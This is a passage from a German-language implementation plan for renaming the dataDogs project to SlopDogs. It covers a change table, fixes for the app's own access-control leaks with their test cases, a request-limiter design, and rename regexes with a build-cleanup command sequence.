| `kennels.ts:171` | "Auto-added by dataDogs: required by …" | P2 | "Auto-added by SlopDogs" |
| `snapshots.ts:394-396` (get_kennel_snapshot_lead_result) | "the public GET /:kennelId endpoint" | P3 | "GET /k/:id" |
| `snapshots.ts` alle Snapshot-Dog-Werkzeuge | Beschreibung ohne Rechtehinweis | P1 | += "dogs you may not read are redacted (no code, no context, no result), exactly like /api/kennels/:id/run" |
| `nodes.ts:38-39` (list_nodes), Schema :41-54 | "Default limit=50, cap=200 …" | P4b | Schema += sort(name,updatedAt,proven,calls30d,reuse), provenOnly; Text "Prefer proven dogs: sort:'proven' lists battle-tested dogs first (usage x reliability x reuse x kennel stars); every node carries `stats`" |
| `nodes.ts:97-99,112` (tsCodePreview) | 200 Zeichen Code fuer readable | P3.5 | fuer RUN-only `null` |
| `nodes.ts:155-156` (get_node) | Detail | P3.5, P4b | += "`myRights`"; += "`stats` + `usage` (kennels using this dog, transitive)" |
| `nodes.ts:359-360` (save_node) | "Only the owner (or super-user) can save" | P3.5 | "owner or editor" (Kennel-Owner-Bypass bleibt entfernt) |
| `nodes.ts:424-425` (get_node_versions) | "not found if private and caller not owner" | P3.5 | "requires read right" |
| `acl.ts:75-76, 153-154, 195-196, 224-225` | grant/revoke/release/list mit Rollen editor/viewer/owner | P3.5 | Rollen `editor \| reader (alias viewer) \| runner`; "run without read" als eigener Satz; `list_collaborators` "not found unless you can read the entity; e-mails only for owner/editors" |
| `meta.ts:28-30` (get_readme) | "Returns the dataDogs README" | P2 | SlopDogs |
| `meta.ts:47-57` (health_check) | serverTime, user | P4, P4b | += `stats {pending, dropped, lastFlushError}`, `dogStats {pendingDogs, referenceRows}` |
| `mcp/tools/keys.ts` (neu) | — | P4c | set_key/list_keys/delete_key; "Agents may store and list; the value is never returned; use `keys.fetch` in dog code" |
| `openapi.ts:75-78, 148-150, 175, 198` | "dataDogs Actions", "dataDogs — Kennel Master", Starter, Realm | P2, P3 | SlopDogs; Starter += "Run the public kennel at /k/weather" |
| `mcp/skill.md:1,5,26` | Titel/Intro "dataDogs" | P2 | SlopDogs |
| `skill.md:73` | "What you can do — 47 tools" | P3 (Lint) | Zahl aus `tools/list` pruefen oder streichen |
| `skill.md:75-87` | Werkzeugliste nach Gruppen | P3.5, P4b, P4c | += Rechte-Verben, Bewaehrt-Sortierung, Keys-Werkzeuge |
| `skill.md:98` | "Fetch `…/api/kennels/<id>/run` instead" | P3 | "`/k/<id>` answers 200 with an empty body when the lead failed; check `/api/kennels/<id>/run`" |
| `skill.md:100-131` | Visibility & access (owner/editors/viewers, community) | P3.5 | Modell NONE<RUN<READ<EDIT<OWN, `run-only`, `runners`, "run without read", ACL-Verben, Version-Pin |
| `skill.md:132-140` | Architecture: "its yield is the public response" | P3 | += "reachable at `/k/<kennelId>`; docs at `/k/<kennelId>/docs`" |
| `skill.md:269-270, 469` | Export/Import-Pfade | — | unveraendert; P1 += "dogs you cannot read are exported as reference stubs" |
| `skill.md:272` | "dein dataDogs-Host" | P2 | SlopDogs-Host |
| `skill.md:481` | "`<base>/<kennel-id>?<params>`" | P3 | "`<base>/k/<kennel-id>?<params>`; docs `<base>/k/<kennel-id>/docs`" |
| `skill.md:627,631` | DATADOGS_VM_TIMEOUT_MS | P2 | SLOPDOGS_ |
| `skill.md:681, 731-732` | Beispielantworten `publicUrl: "/my-greeting"`, runUrl | P3 | `/k/…` + docsUrl/openapiUrl |
| `skill.md:774, 816` | "Every kennel is a URL. A share button is mandatory" | P3 | += "the URL is `location.origin + '/k/' + kennelId` — never hard-code the host" |
| `skill.md:834-841` | wsUrl, Teilen aus location | — | unveraendert |
| `skill.md:871` | "same payload as the public `/:kennelId` endpoint" | P3 | `/k/:id` |
| `skill.md:881` | "list_kennels and get_kennel return only metadata + presence flags" | P4 | += stats/sort/filter |
| `skill.md` (neu "Proven dogs") | — | P4b | "Before building: `list_nodes {search, sort:'proven'}`; a proven badge means >=5 runs/30 d, public run, reused, reliability >= 0.8" |
| `skill.md` (neu "Keys") | — | P4c | Vertrag `keys.fetch`, `{{key:alias}}`, Domain-Allowlist, kein Klartext |
| `README.md:1, :307, :339, :377` | Data Hunt / dataDogs / `datadogs://skill` | P2 | SlopDogs, `slopdogs://skill` |
| `README.md:32, :230, :418`; `:395-396` | `GET /:kennelId`; `/api/kennels/:id/swagger.json\|docs` | P3 | `/k/:kennelId`; Tabelle += `/k/:id/docs`, `/k/:id/openapi.json`; alte Zeilen "308 -> /k/…" |
| `README.md:337-351` (ACL tools) | Rollen | P3.5 | run/read/edit/own, runner, run-only |
| `README.md:383-398` (API Kennels) | Tabelle | P3.5, P4, P4b, P4c | += `/api/:sub/:id/acl`, `/api/kennels/:id/rating`, `?sort=calls30d\|rating&minStars&minCalls`, `/api/nodes/:id/usage`, `?sort=proven`, `/api/keys`, `/api/landing` |
| `README.md:470-474` | `localhost:4300` / `/kennel/<id>` | P3 | `/kennels`, `/kennels/<id>` |
| `README.md:523, :677` | `curl …/my-kennel` | P3 | `/k/my-kennel` |
| `AISkill.md:1,5,76,86,118` | dataDog(s) | P2 | SlopDogs |
| `AISkill.md:46` | "`localhost:3000/<kennel-id>`" | P3 | `/k/<kennel-id>` |
| `AISkill.md:215` | "`GET /:kennelId?params`" | P3 | `/k/:kennelId`; += `/k/:id/docs`, `/k/:id/openapi.json` |
| `AISkill.md:454-456` | Public/Swagger/Edit-URLs | P3 | `/k/<id>?…`, `/k/<id>/docs`, `/kennels/<id>` |
| `AISkill.md:116-171` | Auth/ACL-Abschnitt | P3.5 | neues Modell |
| `.cursor/skills/datadogs-mcp-gateway/SKILL.md` | Spiegel von skill.md (245 Zeilen) | P2 | `git mv` (R9) **und** Inhalt durch einen 5-Zeiler ersetzen, der auf `mcp/skill.md` verweist — zwei Wahrheiten werden eine (Lotus) |
| `.cursor/skills/nira/SKILL.md:3` | "dataDogs nira kennel public endpoint" | P2, P3 | SlopDogs, `/k/nira` |
| `mcp/integration/mcp-gateway.integration.cjs:23` | `DATADOGS_MCP_BEARER` | P2 | `SLOPDOGS_MCP_BEARER` (+Alias) |

Jede Phase endet mit dem gleichen Beweis vor dem Commit: `npm run typecheck`, `npm run check:integration-dogs` (zusammen `npm test`, `package.json:94-97`), StartupTest lokal (`RUN_STARTUP_TESTS=1 npm start`, laeuft nach `listen`, `main.ts:224`), bei UI-Aenderungen `npm run ui:build` ohne Budget-Fehler, bei MCP-Aenderungen `npm run test:mcp:integration` gegen den **lokalen** Server (nie gegen Render). Dann Freigabe des 10-0, dann Commit. Das int-Deploy und der Live-Check sind Sache des 10-0.

### P1 — Fixes (vor allem anderen, keine Konfliktflaeche)

**Ziel.** Vier bekannte Wunden schliessen, die unabhaengig vom Umbau sind: der oeffentliche Kennel-Lauf und die Spec-Erzeugung laufen an jeder Bremse vorbei; der Seed macht 21 volle Partitions-Scans je Boot; die `/versions`-Route braucht einen Regressionstest; die MCP-Snapshot-Werkzeuge liefern jeden Dog roh (Leck L4/L5 aus Niras Bericht — Lotus: Fix nach P1, Fixes vor Features).

**Leck L4/L5 (Nira, gepruft).** `mcp/tools/snapshots.ts:106-142` (`loadVisibleSnapshot`) prueft nur `canRead(kennel)`; `get_snapshot_dog_result` :455-470, `get_snapshot_dog_vmcontext` :513-533, `get_snapshot_dog_code` :472-489 liefern danach jeden Dog roh — ohne die per-Dog-Redaktion, die der HTTP-Pfad hat (`KennelRunHandler.ts:485` -> `redactWavesForCtx` :269-317). `KennelSnapshotCache` (`mcp/snapshots/KennelSnapshotCache.ts:32-89`) haelt rohe Waves und speichert `triggerUserId`, prueft ihn beim Lesen aber nie. Folge: wer einen Kennel lesen darf, sieht ueber den Snapshot-Pfad Code, Ergebnis und `vmContext` privater Dogs, die ihm der HTTP-Pfad verweigert.

**Dateien.**

| Datei | Aenderung |
|---|---|
| `mcp/tools/snapshots.ts:106-142` | `loadVisibleSnapshot` liefert die Waves durch `redactWavesForCtx(waves, ctx)` (Funktion aus `KennelRunHandler.ts:269-317` nach `services/wavesRedaction.ts` verschieben und aus beiden Stellen importieren); Redaktion **beim Lesen**, nicht beim Cachen — der Cache bleibt roh (er wird von verschiedenen Lesern mit verschiedenen Rechten gelesen), der Leser bekommt seine Sicht. Alle Werkzeuge, die aus dem Snapshot lesen (:393-409, :455-573, `find_snapshot_dogs`, `list_snapshot_waves`), gehen ueber diese eine Stelle. |
| `server-app/heavyRequestLimiter.ts` | Klasse verallgemeinern: Konstruktor nimmt `options: { name; paths; methods?; maxConcurrent; queueTimeoutMs }`. `HEAVY_PATHS` (:51-55) wird zum Default der ersten Instanz. `isHeavy` prueft `methods` (Default alle). 503-Text nennt `name`. Statische Fabriken `HeavyRequestLimiter.heavy()` und `HeavyRequestLimiter.publicRuns()`. |
| `server-app/createHttpApplication.ts:171` | Zwei Instanzen montieren, beide vor `/static`: `HeavyRequestLimiter.heavy().applyTo(app)` (wie heute), dann `HeavyRequestLimiter.publicRuns().applyTo(app)`. |
| `seed-data/seed-helpers.ts:6-9` | `kennelExists`: `(await store.findByLineage('KennelConfig', kennelLineageId)).length > 0` statt `findByType` + `some`. |
| `store/IStore.ts` | pruefen, dass `findByLineage(type, lineageId)` im Interface steht (in `store/PrismaStore.ts:205-208` vorhanden); falls nicht, ergaenzen. |
| `StartupTest.ts` | fuenf neue Tests (unten), Aufrufe in `runAllTests` (:68-127) ergaenzen. |
| `.env.example`, `.env.integration.example` | Block "Heap-Budget und Speicher-Bremsen": `MAX_CONCURRENT_PUBLIC_RUNS`, `PUBLIC_RUN_QUEUE_TIMEOUT_MS` dokumentieren. |

**Vertraege.**

```ts
// server-app/heavyRequestLimiter.ts
export interface HeavyRequestLimiterOptions {
    name: string;                       // fuer Log und 503-Text: 'heavy' | 'public'
    paths: readonly RegExp[];           // getestet gegen req.path
    methods?: readonly string[];        // Default: alle; public: ['GET', 'POST']
    maxConcurrent: number;
    queueTimeoutMs: number;
}
export class HeavyRequestLimiter {
    constructor(options: HeavyRequestLimiterOptions);
    static heavy(): HeavyRequestLimiter;       // MAX_CONCURRENT_HEAVY_REQUESTS (8), HEAVY_REQUEST_QUEUE_TIMEOUT_MS (20000), HEAVY_PATHS wie :51-55
    static publicRuns(): HeavyRequestLimiter;  // MAX_CONCURRENT_PUBLIC_RUNS (4), PUBLIC_RUN_QUEUE_TIMEOUT_MS (20000), PUBLIC_PATHS (unten), methods GET/POST
    applyTo(app: Application): void;
    isHeavy(path: string, method?: string): boolean;   // public, fuer den Test
}
```

Public-Pfade **in P1** (vor `/k/`; die Bremse liegt bei Schritt 6, also vor `express.static` — deshalb werden Dateinamen mit Punkt und feste Segmente ausgenommen):

```ts
const PUBLIC_PATHS_P1: readonly RegExp[] = [
    /^\/(?!(?:api|auth|static|mcp|actions|save|kennel|kennels|\.well-known)(?:\/|$))[^/.]+\/?$/,
    /^\/api\/kennels\/[^/]+\/swagger\.json\/?$/,
];
```

Bekannte Luecke in P1 (nur bis P3): ein Kennel-Name mit Punkt (`foo.bar`) wird nicht gebremst, weil er von einem Angular-Artefakt nicht zu unterscheiden ist. P3 ersetzt die Liste durch `[/^\/k\/[^/]+\/?$/, /^\/k\/[^/]+\/openapi\.json\/?$/]` — dann ist die Bremse exakt.

Env (mit Default):

```
# MAX_CONCURRENT_PUBLIC_RUNS      — gleichzeitige oeffentliche Kennel-Laeufe (/k/:id, openapi.json). Default 4.
#                                   Eigener Topf: UI-Listen (Heavy-Gate, 8) warten nicht hinter Besuchern.
# PUBLIC_RUN_QUEUE_TIMEOUT_MS     — Wartebudget in der Public-Schlange, danach 503 + Retry-After. Default 20000.
```

Warum 4 und nicht 6: 512 MB, `--max-old-space-size=320` (`package.json:85`), jeder Lauf haelt Waves im Heap (`heavyRequestLimiter.ts:2-17`); die Zahl ist gesetzt, nicht gemessen — wer misst, stellt die Env.

**Ablauf (ASCII).**

```
Besucher      Express(6: heavy)   Express(6b: public)                  static(8)      Routen(9-16)
GET /wetter ------> kein HEAVY_PATH -> PUBLIC_PATHS_P1 trifft, GET
                                       active < 4 ? durch : Schlange (20 s) -> 503 Retry-After
                                       res.on('finish'|'close') gibt Platz zurueck
                                                                           -> kein Treffer -> /:kennelId handlePublicGet
GET /main-abc.js -> kein HEAVY_PATH -> Punkt im Namen: kein Treffer     -> static liefert
GET /kennels -----> kein HEAVY_PATH -> festes Segment: kein Treffer     -> kein Treffer -> SPA-Fallback
```

**Randfaelle.** 503 aus der Bremse ist kein Aufruf (P4 zaehlt erst in `runKennel`). Ein Request, dessen Client vorher auflegt, gibt den Platz per `close` zurueck (:97-107, bleibt). HEAD wird von der Public-Bremse nicht angefasst (`methods`). Beide Limiter bremsen denselben Request nie doppelt: die Pfadmengen sind disjunkt (Heavy: `/api/kennels`, `/api/nodes`, `/api/kennels/:id/run|execute`; Public: Ein-Segment ohne Punkt, `swagger.json`).

**Testfaelle (Given/When/Then).**

1. `testPublicLimiterCoversPublicPaths` — Given `HeavyRequestLimiter.publicRuns()`; When `isHeavy('/wetter','GET')`, `isHeavy('/wetter/','POST')`, `isHeavy('/api/kennels/w/swagger.json','GET')`; Then true. When `isHeavy('/kennels')`, `isHeavy('/main-abc.js')`, `isHeavy('/favicon.ico')`, `isHeavy('/api/kennels')`, `isHeavy('/kennel/w')`, `isHeavy('/wetter','HEAD')`; Then false.
2. `testPublicLimiterQueuesAndReleases` — Given Limiter mit `maxConcurrent 2`, `queueTimeoutMs 200`, Fake-App, die die Middleware einsammelt; When drei Fake-Requests auf `/x` gleichzeitig, keiner beendet; Then zwei `next()`, einer wartet. When einer `finish` feuert; Then der dritte bekommt `next()`. When vier Requests und keiner endet; Then der vierte bekommt nach 200 ms 503 mit `Retry-After: 1`.
3. `testKennelExistsUsesLineageLookup` — Given Fake-Store, der `findByType`-Aufrufe zaehlt und `findByLineage` mit einer Zeile beantwortet; When `kennelExists(store, 'x')`; Then true und `findByType`-Zaehler 0.
4. `testVersionsRespectCanRead` — Given privater Kennel mit `ownerId 'U1'` (ueber `kennelsController.create` mit ACL-Feldern); When `handleGetVersions` mit Fake req/res und `req.ctx = {user:null,isSuperUser:false}`; Then 404. When `ctx.user.id === 'U1'`; Then 200 und Array.
5. `testSnapshotToolsRedactPerDog` — Given oeffentlicher Kennel K mit zwei Dogs: D1 public, D2 privat (`ownerId 'U1'`, `visibility 'private'`); Snapshot von U1 erzeugt (`refresh_kennel_snapshot` mit `ctx.user.id 'U1'`, dann `wait_for_kennel_snapshot`); When `get_snapshot_dog_result`, `get_snapshot_dog_code`, `get_snapshot_dog_vmcontext` fuer D2 mit `ctx = {user:{id:'U2'},isSuperUser:false}` und mit anonymem ctx; Then dieselbe Antwort wie `GET /api/kennels/K/run` fuer denselben ctx liefert (redigiert: kein `codeTs`, kein `result`, kein `vmContext` von D2 — Form exakt wie `redactWavesForCtx`); When als U1; Then roh. When als `isSuperUser` ohne user; Then roh (Short-Circuit :270 bleibt, wie HTTP).

**Abnahmekriterien (messbar).**

- Test 5 gruen; `git grep -n "redactWavesForCtx"` zeigt genau zwei Rufer (HTTP `/run`, Snapshot-Leser) und eine Definition (`services/wavesRedaction.ts`).

- Lokal 9 parallele `GET /<seed-kennel>` (curl-Schleife mit `&`): hoechstens 4 laufen gleichzeitig (Log der Bremse zaehlt `active`), die uebrigen warten; `GET /api/kennels` waehrenddessen antwortet (nicht hinter der Public-Schlange).
- Boot-Log mit `DEBUG=prisma:query` (`.env.example:117`): in der Seed-Phase kein `SELECT … FROM "Dog" WHERE "type" = 'KennelConfig'` ohne `lineageId`-Bedingung; 21 Punkt-Lookups (gezaehlt: 21 Aufrufe in `seed-data/seed.ts:18-39`).
- StartupTest 1-4 gruen; `npm test` gruen.

**Commit-Schnitt.**

1. `fix(seed): kennelExists ueber findByLineage statt Vollscan` — seed-helpers, Test 3.
2. `feat(gate): zweite Schleuse fuer oeffentliche Kennel-Laeufe (MAX_CONCURRENT_PUBLIC_RUNS)` — Limiter, Montage, Env-Doku, Tests 1-2.
3. `test(api): /versions respektiert canRead` — Test 4 (kein Codefix; dokumentiert W5).
4. `fix(mcp): Snapshot-Werkzeuge redigieren je Dog wie der HTTP-Pfad (L4/L5 = Nira F2)` — `services/wavesRedaction.ts`, `snapshots.ts`, `KennelRunHandler.ts` (Import statt Definition); Test 5.
5. `fix(acl): Lecks F1, F3, F4, F5 schliessen (Nira, sofort deploybar, auch ohne run-only)` — siehe unten; Tests 6-9.

**Niras Leck-Fixes F1-F5 (Nira 1.3; F2 ist Commit 4).** Sofort deploybar, unabhaengig von P3.5; in P1, weil Fixes vor Features gehen.

| Leck | Datei:Zeile (geprueft, Nira) | Fix in P1 |
|---|---|---|
| F1 Export ohne per-Dog-ACL | `api/routes/KennelBundleHandler.ts:86-99` sammelt transitiv jeden erreichbaren SerializedDog/Mimic mit voller `config`; nur der Kennel wird geprueft (:71) | je Dog `canRead(dog, ctx)`; nicht lesbare Dogs als **Referenz-Stub** `{id, lineageId, displayName, redacted: true}` ohne `config` (Lotus: Stub statt Abbruch); Import warnt (`hinweise`) und laesst die Referenz stehen |
| F3 Swagger-Leck | `KennelSwaggerHandler.ts:30-47` laedt Config ohne canRead; `swaggridAdapter.ts:23-26` schreibt `description, defaultQuery, defaultBody` in die Spec; `/docs` :100-107 rendert den Titel fuer alle | Spec und UI hinter `canRead(kennel)` (ab P3.5: `canRun`); `whispers`/`offering` (defaults) nur bei canRead, sonst leere Beispiele; privat und nicht lesbar -> 404 (kein Titel, keine Existenz) |
| F4 `list_collaborators` ohne Gate | `mcp/tools/acl.ts:235-267` | `canRead`-Gate (404 sonst); E-Mails nur fuer Owner/Editors, sonst nur ids und Anzahl |
| F5 Legacy `/save` erzeugt herrenlose Nodes | `ConfigRouteHandler.ts:315-345`: existiert die id nicht, wird ohne `applyCreateDefaults` gespeichert -> ownerId/visibility leer -> community/public (gefolgert aus `Controller.save` :112-116) | `applyCreateDefaults` auch im Create-Zweig (ownerId = Aufrufer, visibility `private`); Rufer `dog.service.ts:71` unveraendert |

Tests dazu (StartupTest): 6. `testExportStubsUnreadableDogs` — Given oeffentlicher Kennel referenziert privaten fremden Dog; When Export anonym; Then Bundle enthaelt fuer diesen Dog keinen `config`-Block, sondern `redacted: true`; Import des Bundles laeuft durch und warnt. 7. `testSwaggerHiddenForUnreadable` — Given privater Kennel; When `GET /api/kennels/:id/swagger.json` und `/docs` anonym; Then 404 beide (heute 200, F3); Given oeffentlicher Kennel, anonym; Then Spec ohne `defaultBody`-Beispiel, wenn `canRead` false (nur moeglich ab P3.5 run-only — bis dahin identisch mit canRead). 8. `testListCollaboratorsGated` — Given privates fremdes Kennel; When `list_collaborators`; Then not found; als Viewer: ids ohne E-Mails; als Owner: mit E-Mails. 9. `testLegacySaveAppliesCreateDefaults` — Given `POST /save` mit neuer id als U1; Then Node traegt `ownerId U1`, `visibility private`.

Abnahme zusaetzlich: Tests 6-9 gruen; `git grep -n "applyCreateDefaults"` zeigt den `/save`-Create-Zweig.

Abhaengigkeiten: keine untereinander. P2 setzt P1 voraus (P1 beruehrt Dateien, die P2 umbenennt — erst fixen, dann umbenennen, sonst zwei Diffs auf derselben Zeile).

### P2 — Umbenennung komplett im Repo (T1 sichtbar, T2 Scope, T3 Protokoll mit Aliasen)

**Ziel.** Ein Commit, der jede Erwaehnung von dataDogs im Repo auf SlopDogs bringt — Scope `@datadogs/*` -> `@slopdogs/*`, sichtbare Texte, Protokollnamen — und fuer alles, was ein laufender Client oder ein Render-Dashboard noch mit dem alten Namen anspricht, einen Alias zur Laufzeit haelt. T4 (GitHub-Repo, Render-Host) ist P6.

**Inventar (gezaehlt auf 4b10138, case-insensitiv `datadog`, getrackte Dateien ohne CHANGELOG.md).** 397 Dateien; davon 306 mit `@datadogs/` (244 .ts, 58 .json, 4 .md, 1 .mjs `scripts/generate-seed-modules.mjs:7,22,46-48`). 52 `packages/*/package.json` tragen `peerDependencies: {"@datadogs/core": "file:../core"}` neben `dependencies` (Beispiel `packages/dogs-weather/package.json:24-29`) — verstoesst gegen die Projektregel und faellt im selben Lauf. `tsconfig.json:32ff` 54 Pfadzeilen. `server-registries/fullRegistry.ts` 53, `slimDeployRegistry.ts` 17 Treffer. User-Agent `dataDogs/0.1` in 65 Dateien. "Data Hunt" in `README.md:1`, `package.json:4`, `ui-app/README.md:1,8`, `ui-app/src/index.html:5`. Render-Host `datadogs-9qde` nur in `.env.example:169`. Ordner `.cursor/skills/datadogs-mcp-gateway` (einziger getrackter Pfad mit dem Namen); `.gitignore:49` nennt `.cursor/skills/datadogs-api-workflow/SKILL.md` (ungetrackt, nur Muster). Lockfile `package-lock.json` wird neu erzeugt, nicht editiert. `ui-app/package-lock.json` hat 0 Scope-Treffer (Boreal) und bleibt.

**Ausdruecke R1-R9, in dieser Reihenfolge (spezifisch vor generisch).**

| # | Suchen (RegExp) | Ersetzen | Trifft | Bemerkung |
|---|---|---|---|---|
| R0 | `datadogs-9qde\.onrender\.com` | `\u0000HOST\u0000` (Platzhalter, nach R8 zurueckgetauscht) | `.env.example:169` | Der alte Host bleibt bis P6 stehen; R7 darf ihn nicht in `slopdogs-9qde` verwandeln. |
| R1 | `@datadogs/` | `@slopdogs/` | Imports, `dependencies`, `tsconfig` paths, Registries, Seeds, `generate-seed-modules.mjs`, `spaRouteConstants.ts:8` | Scope. |
| R2 | `MartinSchmieschek/dataDogs(\.git)?` | `MartinSchmieschek/SlopDogs$1` | 55 `package.json` (`repository.url`), 5 UA-Strings mit URL | **Erst in P7 Schritt 13 ausfuehren** (nach dem GitHub-Rename). In P2 wird R2 uebersprungen (`--skip R2`). |
| R3 | `datadogs://` | `slopdogs://` | `mcp/transports/mcp.ts:64` (`SKILL_RESOURCE_URI`), Texte `mcp/spuren-brief.ts:35`, `mcp/werkzeugkasten.ts:5`, `mcp/skill.md` | Der Alias fuer die alte URI wird von Hand ergaenzt (Aliase unten). |
| R4 | `datadogs\.sid` | `slopdogs.sid` | `mcp/auth/sessions.ts:40`, `router.ts:125` | `router.ts:125` loescht danach beide Cookies (Hand). |
| R5 | `DATADOGS_([A-Z_]+)` | `SLOPDOGS_$1` | `packages/core/src/runtimeLog.ts:9-13`, `SerializedDog.ts:404,850,968`, `KennelRun.ts:129`, `mcp.ts:166-168`, `mcp/tools/kennels.ts:443,625,671`, `snapshots.ts:199`, `KennelRunHandler.ts:101`, `skill.md:627,631`, `.env.example:116-118,201,204`, `.env.integration.example:19`, `mcp-gateway.integration.cjs:23`, `PrismaCacheHandler.ts:35` (`__DATADOGS_NEG_CACHE__` wird so zu `__SLOPDOGS_NEG_CACHE__`) | Alias-Leser von Hand. |
| R6 | `\bdataDogId\b` | (unveraendert) | 3 Seeds | Schutz: R7 darf lokale Variablen nicht treffen — `\bdataDogs\b` trifft `dataDogId` nicht (kein `s`), R6 ist nur die Kontrolle im Dry-Run-Protokoll. |
| R7a | `dataDogs/0\.1(?! \()` | `SlopDogs/0.2 (+https://github.com/MartinSchmieschek/dataDogs)` | 65 Dateien User-Agent | Kontakt-UA (Nominatim/MusicBrainz verlangen ihn). Die URL bleibt bis R2 in P6 die alte, damit sie gueltig ist. UA-Strings, die schon eine URL tragen (`dadJoke:13`, `wikidata:20`, `musicBrainz:14`, `wikivoyage:15`, `wikipedia:89`, `overpassMirrorChain.ts:193`), bekommen nur R7. |
| R7 | `\b(dataDogs\|DataDogs\|datadogs)\b` (case-sensitiv, drei Alternativen) | `SlopDogs` / `SlopDogs` / `slopdogs` | Prosa, Titel, Realms (`ConfigRouteHandler.ts:23`, `mcp.ts:197`, `openapi.ts:198`), `serverInfo.name` (`mcp.ts:81`), Resource-Anzeigename (`mcp.ts:120`), `openapi.ts:75,78,148,150`, `personal-tokens.ts:166`, `consent-page.ts:19,46`, `kennels.ts:171`, `meta.ts:30`, `grimoire.ts:241`, `kennel-list.component.ts:468`, `.cursor/skills/*`, README/AISkill/skill.md/BACKLOG, `packages/core/package.json:3` | Nicht in `CHANGELOG.md`. `.amar/`, `.boreal/` sind gitignored und stehen nicht in `git ls-files`. |
| R8 | `Data Hunt( -- The Lodge)?` | `SlopDogs$1` | `README.md:1`, `package.json:4`, `ui-app/README.md:1,8`, `ui-app/src/index.html:5` | Ein Name (Follie 2.3, A030). "The Lodge" bleibt als Raumname in der ui-app-README. |
| R9 | Datei/Ordner (kein Regex) | `git mv .cursor/skills/datadogs-mcp-gateway .cursor/skills/slopdogs-mcp-gateway`; `.gitignore:49` -> `.cursor/skills/slopdogs-api-workflow/SKILL.md`; root `package.json` `"name": "dataDogs"` -> `"slopdogs"` (npm verlangt Kleinschreibung); `peerDependencies`-Block aus 52 `packages/*/package.json` entfernen | Hand bzw. Skriptteil `--files`. |

Ausnahmen, die **nach** P2 mit `datadog` im Repo stehen duerfen (und nur diese): Alias-Leser (unten), Kommentare der Form `frueher DATADOGS_*` / `vormals dataDogs`, `CHANGELOG.md`, R7a-URLs bis P6, `.env.example:169` bis P6, die Footer-Zeile der Landing `SlopDogs, vormals dataDogs` (P5). Alles andere ist ein Fehler.

**Werkzeug: `rename.cjs` (liegt im Scratchpad, nicht im Repo).** Kein `sed -i` unter Git-Bash (CRLF-Falle, Memory `reference_windows_pfad_fallen`). Verhalten:

1. Liest die Dateiliste aus `git ls-files -z` (nur getrackte Dateien), filtert Endungen `.ts .cjs .mjs .js .json .md .prisma .example .html .scss .yml .yaml .txt` und den Ordner `.cursor/`; ueberspringt `package-lock.json`, `CHANGELOG.md`, Binaerdateien.
2. Liest jede Datei als Buffer, dekodiert UTF-8, wendet R0, R1, (R2 nur mit `--with-r2`), R3, R4, R5, R7a, R7, R8 in dieser Reihenfolge als globale String-Replaces an, tauscht den R0-Platzhalter zurueck, kodiert zurueck. Zeilenenden bleiben byte-genau erhalten (kein Split an `\n`).
3. Schreibt nur bei Aenderung; protokolliert `Datei: Treffer je Regel`; `--dry` schreibt nichts und gibt die Summe aus.
4. `--files`: fuehrt R9 aus (`git mv`, `.gitignore`, `package.json`-Name, `peerDependencies` entfernen via JSON-Parse/Stringify mit 2 Leerzeichen und abschliessendem Newline).
5. Bricht ab, wenn `git status --porcelain` vor dem Lauf nicht leer ist.

**Aliase zur Laufzeit (Hand-Edits nach dem Skriptlauf).**

| Stelle | Neu | Alias | Faellt, wenn |
|---|---|---|---|
| Env-Namen | `SLOPDOGS_*` | Helfer in `packages/core/src/runtimeLog.ts`: `export function envFirst(newName: string, oldName: string): string \| undefined` — liest `process.env[newName] ?? process.env[oldName]`; beim ersten Treffer des alten Namens **eine** Logzeile `[env] alias in use: DATADOGS_X -> SLOPDOGS_X`. Genutzt in `runtimeLog.ts` (LOG_LEVEL, VERBOSE, QUIET), `SerializedDog.ts:968` (VM_TIMEOUT_MS), `KennelRun.ts:129`, `mcp.ts:168` (MCP_RATE_LIMIT), `mcp-gateway.integration.cjs:23` (`MCP_BEARER`), `kennels.ts:443,625,671`, `snapshots.ts:199`, `KennelRunHandler.ts:101` | Render-Dashboard des neuen Dienstes traegt nur `SLOPDOGS_*` (P7 Schritt 3) und die Logzeile bleibt einen Deploy lang aus. |
| Resource-URI | `slopdogs://skill` | `mcp.ts:116-142`: `ListResources` liefert zwei Eintraege (alte URI mit `description: "deprecated — use slopdogs://skill"`), `ReadResource` akzeptiert beide. | Alle eigenen Notizen und Skills auf die neue URI (P7 Schritt 11; Pruefung `grep -r 'datadogs://' ~/.claude` = 0). |
| `serverInfo.name` | `slopdogs` (`mcp.ts:81`) | keiner — kein Client haengt daran (Claude-Code-Praefix kommt aus dem Schluessel in `~/.claude.json`; Gateway-Test loggt nur, :163) | sofort |
| Realms | `SlopDogs`, `SlopDogs MCP`, `SlopDogs Actions` | keiner | sofort |
| Cookie | `slopdogs.sid` (`sessions.ts:40`) | `router.ts:125` `clearCookie` fuer beide Namen; alte Sessions gehen verloren (7-Tage-Cookie; DB wird gekippt, Host wechselt) | sofort nach P7 |
| localStorage | `slopdogs.kennelList.sort.v3` (P4 setzt v3 ohnehin) | keiner (Sortier-Praeferenz je Browser geht verloren) | sofort |
| Negativ-Cache-Marker | `__SLOPDOGS_NEG_CACHE__:` (`PrismaCacheHandler.ts:35`) | `isNegative` prueft beide Praefixe — sonst werden alte Negativ-Marker in der Cache-DB zu positiven Treffern (gefolgert) | Cache-DB des alten Dienstes ist tot (P7, neue DB) -> Alias faellt in P7 Schritt 14 |
| User-Agent | `SlopDogs/0.2 (+https://github.com/MartinSchmieschek/dataDogs)` | keiner | URL wechselt mit R2 in P6 |
| JWT `iss`/`aud` | unveraendert (`MCP_BASE_URL`, `jwt.ts:60,77-79`) | keiner — der Host-Wechsel in P6 entwertet alle Tokens ohnehin | — |
| `.cursor`-Skill-Ordner | `slopdogs-mcp-gateway` | keiner | sofort |

**Befehlsfolge (jede Zeile aus dem Repo-Root; PowerShell-Fassung, weil das die Primaer-Shell ist; Git-Bash-Aequivalent in Klammern).**

```
 0. git status --porcelain                          # muss leer sein; Branch feature/slopdogs
    npm run typecheck                               # Baseline gruen (Beweis vorher)
 1. node C:/Users/MartinSchmieschek/AppData/Local/Temp/claude/.../scratchpad/rename.cjs --dry
                                                    # erwartet: ~330 Dateien, Summe je Regel; R2 = 0 (uebersprungen), R6 = 3 (nur gemeldet)
 2. node .../rename.cjs                             # Ersetzung R0-R8
    git diff --stat | Select-Object -Last 1         # erwartet: ~330 files changed   (bash: | tail -1)
 3. node .../rename.cjs --files                     # R9: git mv, .gitignore, package name, peerDependencies weg
    Hand-Edits: Aliase (Tabelle oben)
 4. Alte Links und Build-Reste entfernen:
    Remove-Item -Recurse -Force node_modules/@datadogs, dist, ui-app/dist -ErrorAction SilentlyContinue
